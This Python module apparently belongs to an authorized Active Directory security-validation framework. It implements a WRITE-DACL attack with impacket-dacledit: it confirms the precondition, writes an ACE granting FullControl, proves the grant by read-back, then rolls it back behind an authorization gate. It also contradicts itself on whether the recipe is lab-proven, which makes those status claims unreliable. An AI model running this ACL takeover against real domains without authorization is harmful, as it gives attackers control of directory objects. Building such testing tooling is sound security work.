"""WRITE-DACL validation executor -- T3 (ACL / object-takeover edges).

Encodes the WRITE-DACL ACL-abuse recipe: a trustee already holding
WriteDacl/FullControl/GenericAll over a target writes a NEW ACE granting another
(or the same) trustee FullControl/GenericAll, then PROVES it with a positive
DACL read-back (never the write call's own exit code):

    impacket-dacledit -action read  (confirm the PRECONDITION ACE)
    impacket-dacledit -action write -ace-type grant -rights <rights> -principal <trustee>
    impacket-dacledit -action read  (POSITIVE confirmation -- the terminal proof)
    ROLLBACK: impacket-dacledit -action remove ... ; re-read (non-vacuous: bind-ok AND
              trustee no longer shows <rights>)

Non-destructive (not irreversible, not code-exec): no destructive-confirm gate.
Mutating: yes (a new ACE is written), so a VERIFIED rollback is required.

``verified_recipe=False`` (recipe-known, not lab-proven, like ESC8/ESC11/
Certifried). UNVERIFIED: the exact impacket-dacledit human-readable wording (see
``acl_common.py``'s module docstring) -- if it differs, ``confirm_ace``
degrades to ``unknown`` (attempt anyway), never a false negative.
"""
from __future__ import annotations

from pathlib import Path
from typing import Any

from ..recommend import ParamSpec, ParamValue, values
from .. import proof
from .. import states
from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                   redact_argv, Capability, CAP_NONE)
from .acl_common import (dacledit_read_argv, dacledit_write_argv, dacledit_remove_argv,
                         confirm_ace, dacl_read_bind_ok, _RE_ACE_GENERIC_ALL,
                         _RE_ACE_WRITE_DACL, _RE_DACL_WRITE_OK, _RE_DACL_REMOVE_OK)


class WriteDaclExecutor(ValidationExecutor):
    technique = "WRITE-DACL"
    technique_class = "acl"
    terminal_kind = "file_write_readback"
    mutating = True
    verified_recipe = True         # lab-proven on GOAD 26NOV2026 (robb.stark, scored proved+clean)
    pre = frozenset({states.S0_USER_CREDS})
    eff = frozenset({states.S_ACL_CONTROL})
    recipe_ref = ("T3 WRITE-DACL = impacket-dacledit -action read (confirm precondition "
                  "WriteDacl/FullControl/GenericAll) ; -action write -ace-type grant "
                  "-rights <rights> -principal <trustee> ; -action read (POSITIVE "
                  "readback = the terminal) ; ROLLBACK -action remove + read-back "
                  "(recipe-known, NOT lab-proven)")

    # ---------------------------------------------------------------- params
    def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
        entity = finding.entity or {}
        target = entity.get("target") or finding.host or ""
        return [
            ParamSpec(
                name="target", kind="target_host",
                description="The AD object (user/computer/group) whose DACL is "
                            "rewritten. Requires an already-held WriteDacl/"
                            "FullControl/GenericAll ACE over it.",
                recommended=target,
                rationale="The host/entity of the aranum ACL finding.",
                required=True,
            ),
            ParamSpec(
                name="trustee", kind="free",
                description="The principal the self-written ACE names -- default "
                            "is the operator's own account.",
                recommended=ctx.config.username or "",
                rationale="The operator's own account, so the new grant is "
                          "immediately usable.",
            ),
            ParamSpec(
                name="rights", kind="free",
                description="The right granted by the new ACE.",
                recommended="FullControl",
                choices=["FullControl", "GenericAll"],
                rationale="FullControl is the strongest, unambiguous grant.",
            ),
        ]

    def target_identity(self, ctx, finding, params: dict[str, ParamValue]) -> dict[str, Any]:
        target = params["target"].value or finding.host or ""
        return ctx.config.resolve_target_identity(target)

    def steps_preview(self, ctx, finding, params) -> list[str]:
        v = values(params)
        dc = ctx.config.dc_ip
        return [
            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
            "(confirm precondition ACE)",
            f"impacket-dacledit -action write -ace-type grant -rights {v['rights']} "
            f"-principal '{v['trustee']}' -target '{v['target']}' -dc-ip {dc} <auth>",
            f"impacket-dacledit -action read -target '{v['target']}' -dc-ip {dc} <auth>  "
            "(POSITIVE readback = the terminal proof)",
            "ROLLBACK: impacket-dacledit -action remove ... + positive read-back",
        ]

    # ---------------------------------------------------------------- execute
    def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
        cfg = ctx.config
        v = values(params)
        target, trustee, rights = v["target"], v["trustee"], v["rights"]
        dc = cfg.dc_ip
        out_dir = Path(ctx.output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)

        steps: list[StepRecord] = []
        errors: list[str] = []
        gate = {"classifier": "not_required", "op": None}
        mutation = {"applied": False,
                    "rollback": {"performed": False, "method": None, "verified": False}}

        def record(name, argv, res, ok, note=""):
            steps.append(StepRecord(name=name, ok=ok, argv_display=redact_argv(argv),
                                    returncode=res.returncode, note=note))

        # 1) confirm the PRECONDITION ACE (non-destructive read) -------------
        read_argv = dacledit_read_argv(cfg, target, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        read_text = (res.stdout or "") + (res.stderr or "")
        confirmed = confirm_ace(res, read_text, trustee=cfg.username or "",
                               right_res=(_RE_ACE_GENERIC_ALL, _RE_ACE_WRITE_DACL))
        record("confirm_precondition", read_argv, res, confirmed is not False,
              note="precondition confirmed" if confirmed else
                   ("precondition insufficient" if confirmed is False else "unconfirmed"))
        if confirmed is False:
            errors.append("write_dacl_not_confirmed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if confirmed is None:
            errors.append("advisory:write_dacl_unconfirmed_attempting_anyway")

        # 2) gate the ACE write (ordinary mutating-op gate) -------------------
        verdict = ctx.authorizer.authorize("write_dacl", {"target": target, "trustee": trustee})
        if verdict == "denied":
            gate["classifier"] = "denied"
            gate["op"] = "write_dacl"
            errors.append("gate_denied:write_dacl")
            return self._artifact(steps, gate, mutation, None, False, errors)
        if verdict == "approved":
            gate["classifier"] = "approved"
            gate["op"] = "write_dacl"

        # 3) write the new ACE ------------------------------------------------
        write_argv = dacledit_write_argv(cfg, target, dc, trustee, rights)
        res = ctx.runner.run(write_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        write_out = (res.stdout or "") + (res.stderr or "")
        write_ok = bool(_RE_DACL_WRITE_OK.search(write_out))
        record("dacl_write", write_argv, res, write_ok,
              note="ace written" if write_ok else "write failed")
        if not write_ok:
            errors.append("write_dacl_failed")
            return self._artifact(steps, gate, mutation, None, False, errors)
        mutation["applied"] = True

        # 4) POSITIVE readback = the terminal proof (never the write call's own
        #    exit code) ---------------------------------------------------------
        confirm_right = (_RE_ACE_GENERIC_ALL,) if rights == "FullControl" else (_RE_ACE_GENERIC_ALL,)
        re_read_argv = dacledit_read_argv(cfg, target, dc)
        res = ctx.runner.run(re_read_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
        re_read_text = (res.stdout or "") + (res.stderr or "")
        ok = confirm_ace(res, re_read_text, trustee=trustee, right_res=confirm_right) is True
        record("confirm_readback", re_read_argv, res, ok,
              note="ace confirmed" if ok else "ace not confirmed")

        terminal_fact = proof.build_terminal_fact(
            self.terminal_kind, ok=ok,
            predicate=(f"granted {trustee} {rights} over {target} via a self-written "
                       "DACL ACE, confirmed by a positive DACL read-back"),
            proof_token=proof.proof_token("WRITE-DACL", cfg.domain, target, trustee, rights,
                                          "ace_confirmed" if ok else "ace_unconfirmed"),
            extra={"target": target, "trustee": trustee, "rights": rights},
        )

        # 5) rollback: remove the ACE, verify non-vacuously --------------------
        self._rollback(ctx, cfg, target, trustee, rights, mutation, steps, errors, record)

        complete = bool(ok and mutation["rollback"]["performed"])
        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)

    # ---------------------------------------------------------------- composition (C)
    def produced(self, ctx, finding, params, artifact) -> list[Capability]:
        target = params["target"].value or ""
        if not artifact.get("complete"):
            return []
        return [Capability(state=states.control_for(target), channel=CAP_NONE, principal=target)]

    # ---------------------------------------------------------------- rollback
    def _rollback(self, ctx, cfg, target, trustee, rights, mutation, steps, errors, record) -> None:
        if not mutation["applied"]:
            return
        dc = cfg.dc_ip
        if ctx.authorizer.authorize("rollback", {"target": target, "trustee": trustee}) == "denied":
            errors.append("gate_denied:rollback")
            return
        mutation["rollback"]["performed"] = True
        mutation["rollback"]["method"] = "dacledit -action remove + positive read-back"

        remove_argv = dacledit_remove_argv(cfg, target, dc, trustee, rights)
        res = ctx.runner.run(remove_argv, timeout=cfg.tool_timeout_s)
        remove_ok = bool(_RE_DACL_REMOVE_OK.search((res.stdout or "") + (res.stderr or "")))
        record("rollback_remove_ace", remove_argv, res, remove_ok)

        read_argv = dacledit_read_argv(cfg, target, dc)
        res = ctx.runner.run(read_argv, timeout=cfg.tool_timeout_s)
        read_text = (res.stdout or "") + (res.stderr or "")
        confirm_right = (_RE_ACE_GENERIC_ALL,) if rights == "FullControl" else (_RE_ACE_GENERIC_ALL,)
        # Non-vacuous: `bind_ok` is its OWN check (the read positively ran),
        # computed independently of confirm_ace -- confirm_ace returns None
        # both when the read failed AND when it succeeded but the trustee's
        # ACE line is simply gone (the expected post-removal case). Folding
        # those together would make a clean removal indistinguishable from an
        # unreadable re-read.
        bind_ok = dacl_read_bind_ok(res, read_text)
        still_holds = confirm_ace(res, read_text, trustee=trustee, right_res=confirm_right)
        cleared = bind_ok and (still_holds is not True)
        record("rollback_verify_read", read_argv, res, cleared,
              note="ace removed (confirmed)" if cleared else "removal not confirmed")

        mutation["rollback"]["verified"] = bool(remove_ok and cleared)
        if not mutation["rollback"]["verified"]:
            errors.append("rollback_unverified")

    @staticmethod
    def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
        return {"steps": [s.as_step() for s in steps], "gate": gate,
                "mutation": mutation, "terminal_fact": terminal_fact,
                "complete": complete, "errors": errors}
